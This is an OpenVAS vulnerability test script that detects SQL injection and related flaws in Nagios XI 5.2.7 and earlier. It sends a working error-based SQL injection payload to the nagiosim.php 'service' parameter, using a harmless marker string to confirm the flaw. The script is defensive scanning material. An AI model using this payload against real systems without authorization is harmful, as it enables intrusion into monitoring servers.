###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_nagios_xi_multiple_vulnerabilities_06_16.nasl 12051 2018-10-24 09:14:54Z asteins $
#
# Nagios XI Multiple Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:nagios:nagiosxi";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105749");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("$Revision: 12051 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-24 11:14:54 +0200 (Wed, 24 Oct 2018) $");
  script_tag(name:"creation_date", value:"2016-06-03 12:51:38 +0200 (Fri, 03 Jun 2016)");
  script_name("Nagios XI Multiple Vulnerabilities");

  script_tag(name:"summary", value:"The Nagios XI application is vulnerable to multiple vulnerabilities, including unauthenticated SQL injection and  authentication bypass, arbitrary code execution via command injection, privilege escalation, server-side request forgery and account hijacking. These vulnerabilities can be chained together to obtain unauthenticated remote code execution as the root user.");
  script_tag(name:"affected", value:"Nagios XI <= 5.2.7");
  script_tag(name:"solution", value:"Upgrade to Nagios XI 5.2.8 or newer");
  script_tag(name:"solution_type", value:"VendorFix");
  script_xref(name:"URL", value:"http://www.security-assessment.com/files/documents/advisory/NagiosXI-Advisory.pdf");

  script_tag(name:"qod_type", value:"remote_active");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
  script_dependencies("gb_nagios_XI_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("nagiosxi/installed");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

url = dir + "/includes/components/nagiosim/nagiosim.php?mode=resolve&host=a&service='+AND+(SELECT+1+FROM(SELECT+COUNT(*),CONCAT(" +
            "'|',(SELECT+0x53514c2d496e6a656374696f6e2d54657374),'|',FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)+OR+'";

if( http_vuln_check( port:port, url:url, pattern:'(SQL-Injection-Test|relation "information_schema.character_sets" does not exist)' ) )
{
  report = report_vuln_url( port:port, url:url  );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );

